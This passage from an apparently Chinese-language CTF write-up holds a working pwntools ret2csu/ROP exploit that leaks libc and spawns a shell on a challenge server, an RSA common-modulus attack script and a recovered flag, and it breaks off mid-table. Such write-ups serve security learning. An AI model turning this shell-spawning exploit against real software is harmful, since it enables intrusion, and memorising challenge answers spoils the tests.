<p>程序存在栈溢出，在泄露libc地址的时候，调用<code>sleep</code> 函数，会把程序的<code>rdx</code> 置为0，使用rop调用write函数无法输出内容。因此使用ret2csu泄露libc：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/205858">ret2libc</a></p>
<p>漏洞点：</p>
<p><img src="https://s2.loli.net/2022/01/02/SRAvNJ6lzIj2WOg.png" alt="image"></p>
<p>csu:</p>
<p><img src="https://s2.loli.net/2022/01/02/nNyB7dm6qCl5VIo.png" alt="image"></p>
<p>csu利用脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">log.success(<span class="string">&quot;csu_end_addr =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(csu_end_addr)))</span><br><span class="line">log.success(<span class="string">&quot;csu_front_addr =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(csu_front_addr)))</span><br><span class="line">log.success(<span class="string">&quot;write_got =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(write_got)))</span><br><span class="line">log.success(<span class="string">&quot;read_got =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_got)))</span><br><span class="line">log.success(<span class="string">&quot;main_addr =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(main_addr)))</span><br><span class="line">log.success(<span class="string">&quot;bss_base =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(bss_base)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r13d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r15</span></span><br><span class="line">    payload = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x38</span> </span><br><span class="line">    payload += p64(last)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
<p>利用exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;./minimelfistic&#x27;</span></span><br><span class="line">REMOTE = <span class="literal">True</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE:</span><br><span class="line">    <span class="comment"># pass</span></span><br><span class="line">    p = remote(<span class="string">&#x27;188.166.174.81&#x27;</span>,<span class="number">31482</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(filename)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># main_addr = 0x4008D9</span></span><br><span class="line"><span class="comment"># write_plt = e.plt[&#x27;write&#x27;]</span></span><br><span class="line"><span class="comment"># write_got = e.got[&#x27;write&#x27;]</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400a43</span></span><br><span class="line"><span class="comment"># pop_rsi_r15 = 0x0000000000400a41</span></span><br><span class="line">ret_addr = <span class="number">0x0000000000400616</span></span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x4008D9</span></span><br><span class="line">bss_base = elf.bss()</span><br><span class="line">csu_end_addr= <span class="number">0x400A3A</span></span><br><span class="line">csu_front_addr = <span class="number">0x400A20</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;csu_end_addr =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(csu_end_addr)))</span><br><span class="line">log.success(<span class="string">&quot;csu_front_addr =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(csu_front_addr)))</span><br><span class="line">log.success(<span class="string">&quot;write_got =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(write_got)))</span><br><span class="line">log.success(<span class="string">&quot;read_got =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_got)))</span><br><span class="line">log.success(<span class="string">&quot;main_addr =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(main_addr)))</span><br><span class="line">log.success(<span class="string">&quot;bss_base =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(bss_base)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r13d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r15</span></span><br><span class="line">    payload = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x38</span> </span><br><span class="line">    payload += p64(last)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&#x27;9&#x27;</span>*<span class="number">72</span></span><br><span class="line">payload1 = padding + csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, write_got, <span class="number">8</span>, main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;d!\n&#x27;</span>)</span><br><span class="line">addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">&quot;write_got =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(addr)))</span><br><span class="line">libc_base = addr-<span class="number">0x110210</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">system_addr = libc_base + <span class="number">0x4F550</span></span><br><span class="line">bin_str = libc_base + <span class="number">0x1B3E1A</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload2 = padding + csu(0, 1, read_got, 0, bss_base, 0x100, main_addr)</span></span><br><span class="line"><span class="comment"># log.success(&quot;sending payload2 ---&gt;&quot;)</span></span><br><span class="line"><span class="comment"># p.sendline(payload2)</span></span><br><span class="line"><span class="comment"># log.success(&quot;sending payload3 ---&gt;&quot;)</span></span><br><span class="line"><span class="comment"># payload3 = b&#x27;/bin/shx00&#x27;</span></span><br><span class="line"><span class="comment"># payload3 += p64(system_addr)</span></span><br><span class="line"><span class="comment"># p.sendline(payload3)</span></span><br><span class="line"><span class="comment"># log.success(&quot;sending payload4 ---&gt;&quot;)</span></span><br><span class="line"><span class="comment"># payload3 = padding + csu(0, 1, bss_base+8, bss_base, 0, 0, main_addr)</span></span><br><span class="line"><span class="comment"># p.sendline(payload3)</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"></span><br><span class="line">payload2 = padding + p64(ret_addr)+p64(pop_rdi)+p64(bin_str)+p64(system_addr)+p64(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/01/02/5FzNDIYJOnLXw26.png" alt="image"></p>
<p>flag:<code>HTB&#123;S4nt4_15_n0w_r34dy_t0_g1v3_s0m3_g1ft5&#125;</code></p>
<h3 id="Music-Notes">Music Notes</h3>
<hr>
<h2 id="Crypt">Crypt</h2>
<h3 id="Common-Mistake">Common Mistake</h3>
<p>共模攻击</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s,s2n</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="comment"># 欧几里得算法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="comment"># &#123;&#x27;n&#x27;: &#x27;0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef&#x27;, &#x27;e&#x27;: &#x27;0x10001&#x27;, &#x27;ct&#x27;: &#x27;0x55cfe232610aa54dffcfb346117f0a38c77a33a2c67addf7a0368c93ec5c3e1baec9d3fe35a123960edc2cbdc238f332507b044d5dee1110f49311efc55a2efd3cf041bfb27130c2266e8dc61e5b99f275665823f584bc6139be4c153cdcf153bf4247fb3f57283a53e8733f982d790a74e99a5b10429012bc865296f0d4f408f65ee02cf41879543460ffc79e84615cc2515ce9ba20fe5992b427e0bbec6681911a9e6c6bbc3ca36c9eb8923ef333fb7e02e82c7bfb65b80710d78372a55432a1442d75cad5b562209bed4f85245f0157a09ce10718bbcef2b294dffb3f00a5a804ed7ba4fb680eea86e366e4f0b0a6d804e61a3b9d57afb92ecb147a769874&#x27;&#125;</span></span><br><span class="line"><span class="comment"># &#123;&#x27;n&#x27;: &#x27;0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef&#x27;, &#x27;e&#x27;: &#x27;0x23&#x27;, &#x27;ct&#x27;: &#x27;0x79834ce329453d3c4af06789e9dd654e43c16a85d8ba0dfa443aefe1ab4912a12a43b44f58f0b617662a459915e0c92a2429868a6b1d7aaaba500254c7eceba0a2df7144863f1889fab44122c9f355b74e3f357d17f0e693f261c0b9cefd07ca3d1b36563a8a8c985e211f9954ce07d4f75db40ce96feb6c91211a9ff9c0a21cad6c5090acf48bfd88042ad3c243850ad3afd6c33dd343c793c0fa2f98b4eabea399409c1966013a884368fc92310ebcb3be81d3702b936e7e883eeb94c2ebb0f9e5e6d3978c1f1f9c5a10e23a9d3252daac87f9bb748c961d3d361cc7dacb9da38ab8f2a1595d7a2eba5dce5abee659ad91a15b553d6e32d8118d1123859208&#x27;&#125;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">  n = <span class="number">0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef</span></span><br><span class="line">  c1 = <span class="number">0x55cfe232610aa54dffcfb346117f0a38c77a33a2c67addf7a0368c93ec5c3e1baec9d3fe35a123960edc2cbdc238f332507b044d5dee1110f49311efc55a2efd3cf041bfb27130c2266e8dc61e5b99f275665823f584bc6139be4c153cdcf153bf4247fb3f57283a53e8733f982d790a74e99a5b10429012bc865296f0d4f408f65ee02cf41879543460ffc79e84615cc2515ce9ba20fe5992b427e0bbec6681911a9e6c6bbc3ca36c9eb8923ef333fb7e02e82c7bfb65b80710d78372a55432a1442d75cad5b562209bed4f85245f0157a09ce10718bbcef2b294dffb3f00a5a804ed7ba4fb680eea86e366e4f0b0a6d804e61a3b9d57afb92ecb147a769874</span></span><br><span class="line">  c2 = <span class="number">0x79834ce329453d3c4af06789e9dd654e43c16a85d8ba0dfa443aefe1ab4912a12a43b44f58f0b617662a459915e0c92a2429868a6b1d7aaaba500254c7eceba0a2df7144863f1889fab44122c9f355b74e3f357d17f0e693f261c0b9cefd07ca3d1b36563a8a8c985e211f9954ce07d4f75db40ce96feb6c91211a9ff9c0a21cad6c5090acf48bfd88042ad3c243850ad3afd6c33dd343c793c0fa2f98b4eabea399409c1966013a884368fc92310ebcb3be81d3702b936e7e883eeb94c2ebb0f9e5e6d3978c1f1f9c5a10e23a9d3252daac87f9bb748c961d3d361cc7dacb9da38ab8f2a1595d7a2eba5dce5abee659ad91a15b553d6e32d8118d1123859208</span></span><br><span class="line">  e1 = <span class="number">0x10001</span></span><br><span class="line">  e2 = <span class="number">0x23</span></span><br><span class="line">  s = egcd(e1, e2)</span><br><span class="line">  s1 = s[<span class="number">1</span>]</span><br><span class="line">  s2 = s[<span class="number">2</span>]</span><br><span class="line">  <span class="comment"># 求模反元素</span></span><br><span class="line">  <span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = invert(c1, n)</span><br><span class="line">  <span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = invert(c2, n)</span><br><span class="line"></span><br><span class="line">  m = <span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n) % n</span><br><span class="line">  <span class="built_in">print</span>((m))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure>
<h3 id="XMAS-Spirit">XMAS Spirit</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./encrypted.bin&#x27;</span>, <span class="string">&#x27;rb+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  enc = f.read()</span><br><span class="line"><span class="comment"># for i in enc:</span></span><br><span class="line"><span class="comment">#   print(i)</span></span><br><span class="line">table = &#123;</span><br><span class="line"><span class="number">160</span> : <span class="number">0</span>,<span class="number">73</span> : <span class="number">1</span>,<span class="number">242</span> : <span class="number">2</span>,<span class="number">155</span> : <span class="number">3</span>,<span class="number">68</span> : <span class="number">4</span>,<span class="number">237</span> : <span class="number">5</span>,<span class="number">150</span> : <span class="number">6</span>,<span class="number">63</span> : <span class="number">7</span>,<span class="number">232</span> : <span class="number">8</span>,<span class="number">145</span> : <span class="number">9</span>,<span class="number">58</span> : <span class="number">10</span>,<span class="number">227</span> : <span class="number">11</span>,<span class="number">140</span> : <span class="number">12</span>,<span class="number">53</span> : <span class="number">13</span>,<span class="number">222</span> : <span class="number">14</span>,<span class="number">135</span> : <span class="number">15</span>,<span class="number">48</span> : <span class="number">16</span>,<span class="number">217</span> : <span class="number">17</span>,<span class="number">130</span> : <span class="number">18</span>,<span class="number">43</span> : <span class="number">19</span>,<span class="number">212</span> : <span class="number">20</span>,<span class="number">125</span> : <span class="number">21</span>,<span class="number">38</span> : <span class="number">22</span>,<span class="number">207</span> : <span class="number">23</span>,<span class="number">120</span> : <span class="number">24</span>,<span class="number">33</span> : <span class="number">25</span>,<span class="number">202</span> : <span class="number">26</span>,<span class="number">115</span> : <span class="number">27</span>,<span class="number">28</span> : <span class="number">28</span>,<span class="number">197</span> : <span class="number">29</span>,<span class="number">110</span> : <span class="number">30</span>,<span class="number">23</span> : <span class="number">31</span>,<span class="number">192</span> : <span class="number">32</span>,<span class="number">105</span> : <span class="number">33</span>,<span class="number">18</span> : <span class="number">34</span>,<span class="number">187</span> : <span class="number">35</span>,<span class="number">100</span> : <span class="number">36</span>,<span class="number">13</span> : <span class="number">37</span>,<span class="number">182</span> : <span class="number">38</span>,<span class="number">95</span> : <span class="number">39</span>,<span class="number">8</span> : <span class="number">40</span>,<span class="number">177</span> : <span class="number">41</span>,<span class="number">90</span> : <span class="number">42</span>,<span class="number">3</span> : <span class="number">43</span>,<span class="number">172</span> : <span class="number">44</span>,<span class="number">85</span> : <span class="number">45</span>,<span class="number">254</span> : <span class="number">46</span>,<span class="number">167</span> : <span class="number">47</span>,<span class="number">80</span> : <span class="number">48</span>,<span class="number">249</span> : <span class="number">49</span>,<span class="number">162</span> : <span class="number">50</span>,<span class="number">75</span> : <span class="number">51</span>,<span class="number">244</span> : <span class="number">52</span>,<span class="number">157</span> : <span class="number">53</span>,<span class="number">70</span> : <span class="number">54</span>,<span class="number">239</span> : <span class="number">55</span>,<span class="number">152</span> : <span class="number">56</span>,<span class="number">65</span> : <span class="number">57</span>,<span class="number">234</span> : <span class="number">58</span>,<span class="number">147</span> : <span class="number">59</span>,<span class="number">60</span> : <span class="number">60</span>,<span class="number">229</span> : <span class="number">61</span>,<span class="number">142</span> : <span class="number">62</span>,<span class="number">55</span> : <span class="number">63</span>,<span class="number">224</span> : <span class="number">64</span>,<span class="number">137</span> : <span class="number">65</span>,<span class="number">50</span> : <span class="number">66</span>,<span class="number">219</span> : <span class="number">67</span>,<span class="number">132</span> : <span class="number">68</span>,<span class="number">45</span> : <span class="number">69</span>,<span class="number">214</span> : <span class="number">70</span>,<span class="number">127</span> : <span class="number">71</span>,<span class="number">40</span> : <span class="number">72</span>,<span class="number">209</span> : <span class="number">73</span>,<span class="number">122</span> : <span class="number">74</span>,<span class="number">35</span> : <span class="number">75</span>,<span class="number">204</span> : <span class="number">76</span>,<span class="number">117</span> : <span class="number">77</span>,<span class="number">30</span> : <span class="number">78</span>,<span class="number">199</span> : <span class="number">79</span>,<span class="number">112</span> : <span class="number">80</span>,<span class="number">25</span> : <span class="number">81</span>,<span class="number">194</span> : <span class="number">82</span>,<span class="number">107</span> : <span class="number">83</span>,<span class="number">20</span> : <span class="number">84</span>,<span class="number">189</span> : <span class="number">85</span>,<span class="number">102</span> : <span class="number">86</span>,<span class="number">15</span> : <span class="number">87</span>,<span class="number">184</span> : <span class="number">88</span>,<span class="number">97</span> : <span class="number">89</span>,<span class="number">10</span> : <span class="number">90</span>,<span class="number">179</span> : <span class="number">91</span>,<span class="number">92</span> : <span class="number">92</span>,<span class="number">5</span> : <span class="number">93</span>,<span class="number">174</span> : <span class="number">94</span>,<span class="number">87</span> : <span class="number">95</span>,<span class="number">0</span> : <span class="number">96</span>,<span class="number">169</span> : <span class="number">97</span>,<span class="number">82</span> : <span class="number">98</span>,<span class="number">251</span> : <span class="number">99</span>,<span class="number">164</span> : <span class="number">100</span>,<span class="number">77</span> : <span class="number">101</span>,<span class="number">246</span> : <span class="number">102</span>,<span class="number">159</span> : <span class="number">103</span>,<span class="number">72</span> : <span class="number">104</span>,<span class="number">241</span> : <span class="number">105</span>,<span class="number">154</span> : <span class="number">106</span>,<span class="number">67</span> : <span class="number">107</span>,<span class="number">236</span> : <span class="number">108</span>,<span class="number">149</span> : <span class="number">109</span>,<span class="number">62</span> : <span class="number">110</span>,<span class="number">231</span> : <span class="number">111</span>,<span class="number">144</span> : <span class="number">112</span>,<span class="number">57</span> : <span class="number">113</span>,<span class="number">226</span> : <span class="number">114</span>,<span class="number">139</span> : <span class="number">115</span>,<span class="number">52</span> : <span class="number">116</span>,<span class="number">221</span> : <span class="number">117</span>,<span class="number">134</span> : <span class="number">118</span>,<span class="number">47</span> : <span class="number">119</span>,<span class="number">216</span> : <span class="number">120</span>,<span class="number">129</span> : <span class="number">121</span>,<span class="number">42</span> : <span class="number">122</span>,<span class="number">211</span> : <span class="number">123</span>,<span class="number">124</span> : <span class="number">124</span>,<span class="number">37</span> : <span class="number">125</span>,<span class="number">206</span> : <span class="number">126</span>,<span class="number">119</span> : <span class="number">127</span>,<span class="number">32</span> : <span class="number">128</span>,<span class="number">201</span> : <span class="number">129</span>,<span class="number">114</span> : <span class="number">130</span>,<span class="number">27</span> : <span class="number">131</span>,<span class="number">196</span> : <span class="number">132</span>,<span class="number">109</span> : <span class="number">133</span>,<span class="number">22</span> : <span class="number">134</span>,<span class="number">191</span> : <span class="number">135</span>,<span class="number">104</span> : <span class="number">136</span>,<span class="number">17</span> : <span class="number">137</span>,<span class="number">186</span> : <span class="number">138</span>,<span class="number">99</span> : <span class="number">139</span>,<span class="number">12</span> : <span class="number">140</span>,<span class="number">181</span> : <span class="number">141</span>,<span class="number">94</span> : <span class="number">142</span>,<span class="number">7</span> : <span class="number">143</span>,<span class="number">176</span> : <span class="number">144</span>,<span class="number">89</span> : <span class="number">145</span>,<span class="number">2</span> : <span class="number">146</span>,<span class="number">171</span> : <span class="number">147</span>,<span class="number">84</span> : <span class="number">148</span>,<span class="number">253</span> : <span class="number">149</span>,<span class="number">166</span> : <span class="number">150</span>,<span class="number">79</span> : <span class="number">151</span>,<span class="number">248</span> : <span class="number">152</span>,<span class="number">161</span> : <span class="number">153</span>,<span class="number">74</span> : <span class="number">154</span>,<span class="number">243</span> : <span class="number">155</span>,<span class="number">156</span> : <span class="number">156</span>,<span class="number">69</span> : <span class="number">157</span>,<span class="number">238</span> : <span class="number">158</span>,<span class="number">151</span> : <span class="number">159</span>,<span class="number">64</span> : <span class="number">160</span>,<span class="number">233</span> : <span class="number">161</span>,<span class="number">146</span> : <span class="number">162</span>,<span class="number">59</span> : <span class="number">163</span>,<span class="number">228</span> : <span class="number">164</span>,<span class="number">141</span> : <span class="number">165</span>,<span class="number">54</span> : <span class="number">166</span>,<span class="number">223</span> : <span class="number">167</span>,<span class="number">136</span> : <span class="number">168</span>,<span class="number">49</span> : <span class="number">169</span>,<span class="number">218</span> : <span class="number">170</span>,<span class="number">131</span> : <span class="number">171</span>,<span class="number">44</span> : <span class="number">172</span>,<span class="number">213</span> : <span class="number">173</span>,<span class="number">126</span> : <span class="number">174</span>,<span class="number">39</span> : <span class="number">175</span>,<span class="number">208</span> : <span class="number">176</span>,<span class="number">121</span> : <span class="number">177</span>,<span class="number">34</span> : <span class="number">178</span>,<span class="number">203</span> : <span class="number">179</span>,<span class="number">116</span> : <span class="number">180</span>,<span class="number">29</span> : <span class="number">181</span>,<span class="number">198</span> : <span class="number">182</span>,<span class="number">111</span> : <span class="number">183</span>,<span class="number">24</span> : <span class="number">184</span>,<span class="number">193</span> : <span class="number">185</span>,<span class="number">106</span> : <span class="number">186</span>,<span class="number">19</span> : <span class="number">187</span>,<span class="number">188</span> : <span class="number">188</span>,<span class="number">101</span> : <span class="number">189</span>,<span class="number">14</span> : <span class="number">190</span>,<span class="number">183</span> : <span class="number">191</span>,<span class="number">96</span> : <span class="number">192</span>,<span class="number">9</span> : <span class="number">193</span>,<span class="number">178</span> : <span class="number">194</span>,<span class="number">91</span> : <span class="number">195</span>,<span class="number">4</span> : <span class="number">196</span>,<span class="number">173</span> : <span class="number">197</span>,<span class="number">86</span> : <span class="number">198</span>,<span class="number">255</span> : <span class="number">199</span>,<span class="number">168</span> : <span class="number">200</span>,<span class="number">81</span> : <span class="number">201</span>,<span class="number">250</span> : <span class="number">202</span>,<span class="number">163</span> : <span class="number">203</span>,<span class="number">76</span> : <span class="number">204</span>,<span class="number">245</span> : <span class="number">205</span>,<span class="number">158</span> : <span class="number">206</span>,<span class="number">71</span> : <span class="number">207</span>,<span class="number">240</span> : <span class="number">208</span>,<span class="number">153</span> : <span class="number">209</span>,<span class="number">66</span> : <span class="number">210</span>,<span class="number">235</span> : <span class="number">211</span>,<span class="number">148</span> : <span class="number">212</span>,<span class="number">61</span> : <span class="number">213</span>,<span class="number">230</span> : <span class="number">214</span>,<span class="number">143</span> : <span class="number">215</span>,<span class="number">56</span> : <span class="number">216</span>,<span class="number">225</span> : <span class="number">217</span>,<span class="number">138</span> : <span class="number">218</span>,<span class="number">51</span> : <span class="number">219</span>,<span class="number">220</span> : <span class="number">220</span>,<span class="number">133</span> : <span class="number">221</span>,<span class="number">46</span> : <span class="number">222</span>,<span class="number">215</span> : <span class="number">223</span>,<span class="number">128</span> 